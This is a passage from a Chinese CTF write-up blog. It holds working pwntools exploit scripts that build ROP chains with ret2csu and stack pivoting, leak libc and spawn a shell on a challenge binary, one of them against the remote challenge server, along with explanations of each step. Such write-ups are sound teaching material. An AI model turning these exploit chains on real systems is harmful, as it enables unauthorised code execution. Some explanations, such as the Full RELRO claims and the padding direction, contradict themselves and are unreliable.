        # 构造ROP链并发送
        payload=b'a'*0x18+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss_0601040)+p64(0)+p64(read_plt)+p64(pop_rdi)+p64(0)+p64(0x400606)
        payload+=p64(pop6_addr)+p64(0)+p64(1)+p64(read_got)+p64(0x300)+p64(bss_addr)+p64(0)+p64(mov_addr)+p64(0)*7
        payload+=p64(pop_rsp)+p64(bss_addr)

        mydbg() # 附加gdb并连接到ida进行远程调试
        sl(payload) # 发送ROP链
        pause() # 暂停
        sl(p64(read_got)) # 发送read_got的地址

        # 构造第二个ROP链并发送
        payload=p64(0)*3+p64(pop6_addr)+p64(0)+p64(1)+p64(read_got)+p64(8)+p64(bss_0601040-6)+p64(0)+p64(mov_addr)+p64(0)*7
        payload+=p64(pop6_addr)+p64(0)+p64(1)+p64(bss_0601040)+p64(0x8)+p64(read_got)+p64(1)+p64(mov_addr)+p64(0)*7
        payload+=p64(pop6_addr)+p64(0)+p64(1)+p64(read_got)+p64(0x100)+p64(bss_addr+0xa00)+p64(0)+p64(mov_addr)+p64(0)*7
        payload+=p64(pop_rsp)+p64(bss_addr+0xa00)
        pause() # 暂停
        sl(payload) # 发送第二个ROP链
        pause() # 暂停
        s("\x00\x00\x00\x00\x00\x00\x20\x4a") # 发送数据

        libc_base=uu64()-libc.sym['read'] # 计算libc的基地址
        system=libc_base+libc.sym['system'] # 计算system函数的地址
        binsh=libc_base+next(libc.search(b"/bin/sh")) # 计算"/bin/sh"字符串的地址
        lg("libc_base") # 打印日志信息，输出libc_base的值

        # 构造第三个ROP链并发送
        payload=p64(0)*3+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)
        pause() # 暂停
        sl(payload) # 发送
	    p.interactive() # 开始交互模式，此时可以输入shell命令，如ls，pwd等，并看到结果
    except EOFError: # 如果捕获到EOFError异常
        p.close() # 关闭与目标的连接
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>





<h3 id="三、这个脚本运行的大致步骤是："><a href="#三、这个脚本运行的大致步骤是：" class="headerlink" title="三、这个脚本运行的大致步骤是："></a>三、这个脚本运行的大致步骤是：</h3><ol>
<li><p>启动目标进程。</p>
</li>
<li><p>构造一个ROP链，用于泄露”read”函数的地址，从而计算出libc库的基地址。</p>
</li>
<li><p>利用计算出的libc库的基地址，构造一个新的ROP链，用于调用”system”函数执行”/bin/sh”命令。</p>
</li>
<li><p>如果目标进程在这个过程中退出了（可能是因为ROP链有错误，或者因为防御机制阻止了攻击），则开始下一轮的尝试。、</p>
<p>在这个脚本中，攻击者首先通过 sub_400606 函数泄露了 read 函数在 libc 中的实际地址，然后通过地址偏移计算出 libc 的基址，以及 system 函数和 “/bin/sh” 字符串在 libc 中的地址，然后构造 payload，将返回地址修改为 system 函数的地址，实现执行任意命令，这是一个典型的 ret2libc 攻击。</p>
</li>
</ol>
<h3 id="四、ret2csu"><a href="#四、ret2csu" class="headerlink" title="四、ret2csu"></a>四、ret2csu</h3><p>这是一个有关二进制漏洞利用的问题，主要采用了 Return Oriented Programming (ROP)，”ret2csu”，和栈迁移技术来执行任意代码。程序开启了”full relro”，防止了对.got表的直接修改，因此不能直接使用dl-resolve技巧来构造任意函数调用。</p>
<p>这个解题思路是在IDA中找到一个特别的函数sub_400606。这个函数读取了一个特定地址（在这里是601040 + a1）处的值，然后写回到相同的地址。因此，如果a1为0，那么这个函数就实际上进行了一次地址的取值操作。这种特性可以被用来读取read函数在.got表中的地址，然后将read的libc地址写入到601040处。</p>
<p>解题人还发现了，对于他们所使用的libc版本（2.35），read和write函数在libc中的地址仅相差最后两个字节。因此，解题人可以尝试多次改变601040处的值，使其变为write的libc地址，这可以通过改变read的.got表项来实现。注意，在此过程中，他们并未直接修改.got表，而是修改了该地址在内存中的一个副本，这样就绕过了full relro的限制。</p>
<p>接下来，他们使用”write”函数来泄露read在.got表中的地址，从而计算出libc的基址。有了libc的基址，就可以找到system函数的地址，并使用”/bin/sh”字符串来调用它，从而获得一个shell。</p>
<p>“ret2csu”是一种利用程序的__libc_csu_init函数中的一段gadget来进行任意函数调用的技术。在这个题解中，解题人使用它来调用sub_400606函数和write函数。</p>
<p>“栈迁移”则是将栈指针（rsp）移动到新的位置，通常是为了获得更多的可控空间，或者绕过某些防护机制。在这个题解中，解题人通过栈迁移来构造长的ROP链。</p>
<h3 id="五、"><a href="#五、" class="headerlink" title="五、"></a>五、</h3><p>当寻找二进制漏洞和构建漏洞利用链时，研究者并不总是仅限于查看main函数。虽然main函数是程序的入口点，但是它可能并不包含可以被利用的漏洞或者有用的函数。此外，有时候，main函数中的代码可能由于各种原因（比如控制流保护机制）而无法被直接利用。</p>
<p>在这种情况下，研究者会在整个程序的代码中寻找可以被利用的函数或片段（也被称为”gadget”）。这些函数或片段可能位于任何地方，包括库函数、系统调用，或者其他不常用的函数。它们的特性可能有助于绕过某些保护机制，或者提供了执行特定操作的能力，比如修改内存、执行系统调用、或者跳转到其他位置。</p>
<p>在这个问题中，研究者发现了函数sub_400606，它具有特殊的属性，可以用于读取和修改内存，这对于构建漏洞利用链是非常有用的。这也就是为什么他们会去查看并使用这个函数，而不是只关注main函数。</p>
<p>总的来说，寻找和利用二进制漏洞需要对整个程序的代码进行全面的分析和理解，而不仅仅是main函数。这也是二进制漏洞分析和利用的一项重要技能。</p>
<h3 id="六、利用已知地址制造栈溢出"><a href="#六、利用已知地址制造栈溢出" class="headerlink" title="六、利用已知地址制造栈溢出"></a>六、利用已知地址制造栈溢出</h3><p>栈溢出是一种常见的漏洞，通过编写超出预定缓冲区大小的数据，可以覆盖掉在内存中后续的数据，比如函数返回地址。一旦函数返回地址被覆盖，就可以改变程序的执行流程。</p>
<p>在经典的栈溢出利用场景中，常常会看到通过泄露 libc 函数（例如 puts、printf 等）的地址来绕过 ASLR(Address Space Layout Randomization，地址空间布局随机化)的保护。因为在启动 ASLR 保护的情况下，每次程序启动时，动态库（例如 libc.so）的加载地址是随机的。通过泄露某个已知函数的实际运行时地址，可以计算出动态库的基地址，进一步找到其他函数（例如 system）的地址，从而绕过 ASLR。</p>
<p>在这个问题中，你可能在看到没有 puts 或者类似函数来泄露地址时会感到困惑。但其实，这个题目中，利用的是 sub_400606 函数的特性，把 read 的 got 表项地址写入到 601040，然后通过执行 sub_400606 函数，将 read 在 libc 中的实际地址写入到 601040，从而实现了信息泄露。通过这种方式，可以得到 libc 中 read 函数的实际地址，从而可以计算出 libc 的基地址。</p>
<p>所以这是一种不同于经典的通过泄露函数地址来绕过 ASLR 的方法，而是通过利用程序特性来泄露信息，达到绕过 ASLR 的目的。</p>
<p>根据你给出的题解中对 sub_400606 函数的分析，该函数的功能是读取特定内存位置的值（在 qword_601040 + a1 的位置），并将这个值写入到其他的特定内存位置。</p>
<p>这个函数没有明确的任务，它只是对内存进行操作，具体的用途则取决于这个函数在程序中被如何使用。</p>
<p>现在来解释为什么把 read 的 GOT 表项地址写入 601040 后，执行 sub_400606 函数后写入 601040 的却是 read 在 libc 中的实际地址。</p>
<p>这是因为，在程序执行过程中，当执行到调用 read 函数的位置时，程序实际上会跳转到 GOT 表中的 read 表项的地址去执行。而这个 read 表项的地址中，保存的是 read 函数在 libc 中的实际地址（这是程序在加载时动态链接器做的事情）。也就是说，这个 GOT 表项其实是一个指针，指向 libc 中的 read 函数。</p>
<p>因此，如果我们把 read 的 GOT 表项地址写入 601040，然后执行 sub_400606 函数，函数就会去读取 qword_601040 + a1 的值，这里实际上就是读取的 read 的 GOT 表项，也就是 read 函数在 libc 中的实际地址。然后，这个函数又把这个地址写入了 601040，实现了信息泄露。</p>
<h3 id="七、函数定义"><a href="#七、函数定义" class="headerlink" title="七、函数定义"></a>七、函数定义</h3><ol>
<li><code>s = lambda data : p.send(data)</code>：这是一个匿名函数，简化了p.send(data)的操作，可以用<code>s(data)</code>的方式发送数据，其中<code>p</code>是一个socket对象，代表目标程序的一个连接。</li>
<li><code>sl = lambda data : p.sendline(data)</code>：这个函数将给定的数据以一行的形式发送给目标程序。它在数据末尾添加一个换行符(‘\n’)，因为某些程序的输入是按行接收的。</li>
<li><code>sa = lambda text, data : p.sendafter(text, data)</code>：这个函数将等待目标程序输出特定的文本，然后发送数据。这个函数在输入需要同步特定输出时很有用。</li>
<li><code>sla = lambda text, data : p.sendlineafter(text, data)</code>：这个函数和<code>sa</code>的功能类似，但是在发送数据时会自动添加换行符。</li>
<li><code>r = lambda : p.recv()</code>：这个函数简化了接收数据的操作，可以直接用<code>r()</code>接收目标程序发送的数据。</li>
<li><code>rn = lambda x : p.recvn(x)</code>：这个函数可以接收指定数量的数据。</li>
<li><code>ru = lambda text : p.recvuntil(text)</code>：这个函数将从目标程序接收数据，直到遇到特定的文本。</li>
<li><code>dbg = lambda text=None : gdb.attach(p, text)</code>：这个函数将GDB附加到目标进程上，可以用来进行调试。</li>
<li><code>uu32 = lambda : u32(p.recvuntil(b"\xf7")[-4:].ljust(4, b'\x00'))</code>：这个函数从目标程序接收数据，并将接收到的4个字节数据转换为32位无符号整数。</li>
<li><code>uu64 = lambda : u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))</code>：这个函数从目标程序接收数据，并将接收到的6个字节数据转换为64位无符号整数。</li>
<li><code>lg = lambda s : log.info('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s, eval(s)))</code>：这个函数打印带有颜色的日志信息，红色的部分是变量名，其后的十六进制数值是变量值。</li>
<li><code>pr = lambda s : print('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s, eval(s)))</code>：这个函数打印带有颜色的字符串，和<code>lg</code>类似。</li>
</ol>
<p>无符号数并不一定是十六进制的，无符号数只是一种表示整数的方式，它只能表示非负整数。十六进制是一种数制，可以用来表示任何整数，无论是有符号的还是无符号的。</p>
<p>函数<code>u32(data)</code>是一个在pwntools库中常用的函数，它将一个包含4个字节的字符串或字节串转换为一个32位的无符号整数。这个函数常常用在二进制漏洞利用中，例如在处理来自目标程序的内存泄漏信息时。</p>
<p>当函数<code>uu32</code>被调用时，它将从目标程序接收数据，直到接收到字节0xf7（在ASCII中，0xf7对应的字符是除号’÷’）。然后，它会取接收到的数据的最后4个字节，并使用<code>ljust(4, b'\x00')</code>来确保这个字节串的长度至少为4字节。如果长度不足4字节，就会在其左侧（高位）补充零字节，直到长度达到4字节。最后，它将这4个字节的数据使用<code>u32</code>函数转换为一个32位的无符号整数。</p>
<p>这里涉及的字节串到整数的转换是基于小端字节序的，也就是说，字节串的低位字节对应整数的低位字节。这是因为x86和x86_64架构的计算机使用小端字节序，而大多数二进制漏洞利用目标程序都运行在这些架构的计算机上。</p>
<h3 id="八、uu32-x3D-lambda-u32-p-recvuntil-b”-xf7”-4-ljust-4-b’-x00’"><a href="#八、uu32-x3D-lambda-u32-p-recvuntil-b”-xf7”-4-ljust-4-b’-x00’" class="headerlink" title="八、uu32 = lambda : u32(p.recvuntil(b”\xf7”)[-4:].ljust(4, b’\x00’))"></a>八、uu32 = lambda : u32(p.recvuntil(b”\xf7”)[-4:].ljust(4, b’\x00’))</h3><p>这行代码定义了一个名为<code>uu32</code>的函数，这个函数没有输入参数。接下来我会逐一解释这个函数的每个部分。</p>
<ul>
<li><p><code>lambda</code>：在Python中，<code>lambda</code>是用来创建匿名函数的关键字。匿名函数是指没有名字的函数，只有参数列表和表达式。这里，<code>lambda</code>关键字之后的冒号(:)之前是输入参数的位置，这里没有输入参数。冒号之后的部分是该函数的主体。</p>
</li>
<li><p><code>p.recvuntil(b"\xf7")</code>：这是调用<code>p</code>对象的<code>recvuntil</code>方法，该方法会从与之相连的流中读取数据，直到遇到指定的字节序列。在这里，指定的字节序列是<code>b"\xf7"</code>。这行代码会返回从流开始到指定字节序列的所有数据。</p>
</li>
<li><p><code>[-4:]</code>：这是一个切片操作符，用于获取字符串的一个子集。在这里，它用于获取从接收的数据的最后四个字节。</p>
</li>
<li><p><code>.ljust(4, b'\x00')</code>：这是Python字符串的<code>ljust</code>方法，用于对字符串进行左对齐并填充指定的字符到指定的宽度。在这里，它用于确保获取的四个字节的数据长度至少为4个字节。如果获取的数据少于4个字节，那么将在右侧添加<code>\x00</code>字节，直到长度为4。</p>
</li>
<li><p><code>u32()</code>：这是<code>pwntools</code>库中的一个函数，用于将四字节的字符串解析为一个32位无符号整数。在这里，它用于将获取的四个字节的数据解析为一个32位无符号整数。</p>
</li>
</ul>
<p>总结一下，这个函数的工作流程是：</p>
<ol>
<li>从与之相连的流中读取数据，直到遇到指定的字节序列（<code>b"\xf7"</code>）。</li>
<li>获取读取的数据的最后四个字节。</li>
<li>确保获取的数据长度为4个字节，如果不够则在右侧添加<code>\x00</code>字节。</li>
<li>将获取的四个字节的数据解析为一个32位无符号整数。</li>
</ol>
<h3 id="九、转化为无符号字符（十进制）"><a href="#九、转化为无符号字符（十进制）" class="headerlink" title="九、转化为无符号字符（十进制）"></a>九、转化为无符号字符（十进制）</h3><p>在二进制漏洞利用中，将泄露的信息转换为无符号整数有很多重要的原因：</p>
<ol>
<li><p>计算机内部表示和处理数据的方式：计算机在内部使用二进制表示和处理所有的数据。这包括指令、地址、字符、整数等等。因此，当我们从一个程序中获得一些原始的二进制数据（例如，通过一个内存泄露漏洞），我们通常需要将这些数据转换为我们想要的格式以便于处理。在很多情况下，我们需要将这些数据看作是无符号整数，例如内存地址或者函数的偏移量。</p>
</li>
<li><p>无符号整数的范围更大：相对于有符号整数，无符号整数可以表示更大的正整数范围。在处理内存地址或者大的数据偏移量时，这一点是非常重要的。例如，一个32位的有符号整数只能表示从-2147483648到2147483647的整数，但是一个32位的无符号整数可以表示从0到4294967295的整数。</p>
</li>
<li><p>可移植性和兼容性：无符号整数在不同的计算机架构和操作系统之间有更好的可移植性和兼容性。对于二进制漏洞利用，我们通常需要在不同的环境中进行测试和验证，因此需要使用可以在所有环境中一致工作的数据类型。</p>
</li>
</ol>
<p>最后，需要注意的是，虽然这里我们将数据转换为无符号整数，但这并不意味着我们总是要这样做。在不同的情况下，我们可能需要将数据转换为其他的类型，例如字符串或者有符号整数。数据应该被转换为什么类型，取决于我们希望如何使用这些数据。</p>
<h3 id="十、retcsu和ret2dl"><a href="#十、retcsu和ret2dl" class="headerlink" title="十、retcsu和ret2dl"></a>十、retcsu和ret2dl</h3><p><code>ret2csu</code>和<code>ret2dl</code>都是一种返回导向编程（ROP, Return Oriented Programming）攻击方法，他们都是在exploit开发中用于绕过各种内存保护机制（如NX，DEP等）的常用技术。下面分别介绍一下它们：</p>
<ol>
<li><p><strong>ret2csu</strong>:<br>“csu”代表”C standard library startup routines”，这种方法使用程序在初始化过程中自动生成的一段代码（称为csu初始化函数）。<code>ret2csu</code>被用来调用程序已经链接的库中的函数，即使这个函数在程序的plt（过程链接表）中没有条目。这种技术允许我们调用任意函数并设置函数参数，它通常用于调用像read或write这样的函数来泄露内存信息，或者调用system函数来获得shell。</p>
</li>
<li><p><strong>ret2dl</strong>:<br>“dl”代表”dynamic linker”，<code>ret2dl</code>是一种特殊的ROP技巧，主要用于全局偏移表（GOT）完全只读（Full RELRO）的情况。在这种情况下，不能简单地通过GOT覆盖来调用任意的函数。<code>ret2dl</code>主要是利用动态链接器的某些功能，通过构造特殊的链接结构来构造任意函数调用。</p>
</li>
</ol>
<p>这两种方法的主要区别在于，<code>ret2csu</code>是利用程序初始化过程中的代码，而<code>ret2dl</code>则是利用动态链接器的功能。此外，<code>ret2csu</code>通常用于没有开启全局偏移表完全只读（Full RELRO）保护的程序，而<code>ret2dl</code>则可以在开启这种保护的程序中使用。</p>
<h3 id="十一、"><a href="#十一、" class="headerlink" title="十一、"></a>十一、</h3><p>在这里，所有的地址都是在二进制文件中找到的。你可以使用各种二进制分析工具（比如<code>objdump</code>、<code>readelf</code>或者<code>Ghidra</code>、<code>IDA Pro</code>等）来获取这些地址。这里我们简单解释一下每一个地址是如何找到的。</p>
<ol>
<li><p><code>pop_rdi=0x00000000004007e3</code>, <code>pop_rsi=0x00000000004007e1</code>, <code>pop_rsp=0x00000000004007dd</code> 和 <code>pop6_addr=0x4007DA</code> 这些地址是通过在二进制中搜索 ROP gadgets 得到的。这些 gadgets 是一些短的指令序列，后面通常紧跟着一个 <code>ret</code> 指令，被用来在构建 ROP 链时调整栈和寄存器的状态。你可以使用 <code>ROPgadget</code> 这样的工具来搜索这些 gadgets。</p>
</li>
<li><p><code>bss_0601040=0x0601040</code> 和 <code>bss_addr=0x601200</code> 这两个地址是在 ELF 文件的 BSS 段中找到的，这个区域常常用来存放程序中未初始化的全局变量。你可以使用 <code>readelf -S</code> 命令来查看 ELF 文件的各个段和它们的地址。</p>
</li>
<li><p><code>read_plt=0x4004E0</code> 和 <code>read_got=0x600FD8</code> 这两个地址是 read 函数在 PLT 和 GOT 表中的地址。你可以通过查看二进制文件的符号表或者使用工具如 <code>objdump -d</code> 或 <code>readelf -r</code> 来找到这些地址。</p>
</li>
<li><p><code>mov_addr=0x04007C0</code> 这个地址可能是从二进制中分析特定函数或者功能找到的，你可能需要使用反汇编工具或者动态调试工具（比如 <code>GDB</code>、<code>IDA Pro</code> 等）来找到这个地址。</p>
</li>
<li><p><code>ret=0x00000000004004c9</code> 这个地址通常是一个执行 <code>ret</code> 指令的地址，也可以使用工具如 <code>ROPgadget</code> 找到。</p>
</li>
</ol>
<p>注意，这些地址通常是在未开启地址空间布局随机化（ASLR）的环境中固定的。如果目标环境开启了 ASLR，那么你可能需要通过某种方式（如泄露信息或者布鲁特力猜测）来动态地获取这些地址。</p>
<h3 id="ret2dl-exp-py"><a href="#ret2dl-exp-py" class="headerlink" title="ret2dl exp.py"></a>ret2dl exp.py</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
context.log_level='debug'  # 设置日志级别为debug，会输出更多调试信息

# io=process('./ezzzz')  # 本地调试使用这行
io=remote("pwn-12b3fb054a.challenge.xctf.org.cn", 9999, ssl=True)  # 连接远程服务器

# 找到ROP链中使用的一些gadget的地址
pop_rdi=0x4007E3  # gadget: pop rdi; ret
pop_rsi=0x4007E1  # gadget: pop rsi; pop r15; ret

# 构造第一次的payload并发送
pay=b'a'*0x10+p64(0x601c00)+p64(0x400752)
io.send(pay)

sleep(1)  # 等待1秒让程序处理输入

# 构造第二次的payload并发送
pay=b'/bin/sh\x00'+p64(59)+p64(0x601c00)
pay+=p64(pop_rdi)+p64(0x600fd8)+p64(pop_rsi)
pay+=p64(1)*2+p64(0x400606)+p64(0x400510)
io.send(pay)

# 构造第三次的payload并发送
pay=b'/bin/sh\x00'+p64(59)+p64(0x601c00)
pay+=p64(pop_rdi)+p64(0)+p64(pop_rsi)
pay+=p64(0x601040)*2+p64(0x4004e0)+p64(0x400510)
sleep(0.5)  # 等待0.5秒让程序处理输入
io.send(pay)
sleep(0.5)  # 等待0.5秒让程序处理输入
io.send('\x90')  # 发送一个NOP（无操作）指令

# 构造第四次的payload并发送
pay=b'/bin/sh\x00'+p64(59)+p64(0x601c00)
pay+=p64(pop_rdi)+p64(0)+p64(pop_rsi)
pay+=p64(0x6010d0)*2+p64(0x4004e0)+p64(0x4007DA)
pay+=p64(0)+p64(1)+p64(0x601040)+p64(0)+p64(0)+p64(0x601c00-0x10)
pay+=p64(0x4007C0)
sleep(0.5)  # 等待0.5秒让程序处理输入
io.send(pay)
# gdb.attach(io)  # 如果需要，可以在此处附加gdb进行调试
sleep(0.5)  # 等待0.5秒让程序处理输入

# 发送一些额外的数据，可能用于填充缓冲区
io.send(b'a'*0x3b)

# 尝试获取flag
io.sendline('cat flag')
io.recv()

# 进入交互模式，可以手动输入命令和接收输出
io.interactive()
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>







<h2 id="二、web（hellosql）"><a href="#二、web（hellosql）" class="headerlink" title="二、web（hellosql）"></a>二、web（hellosql）</h2><p>平平无奇的sql注入,</p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">DU-玉</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://POISON-Biao.github.io/du-yu/peakedness.html">https://POISON-Biao.github.io/du-yu/peakedness.html</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">DU-玉</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/">
                                    <span class="chip bg-color">巅峰极客</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="qq,qzone,wechat,weibo,twitter,facebook,google,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/wechat.jpg" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias%5Ccomment_bg.jpg") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    .v[data-class="v"] .vwrap .vheader .vinput {
      width: 32%;
      border-bottom: 1px dashed #dedede;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
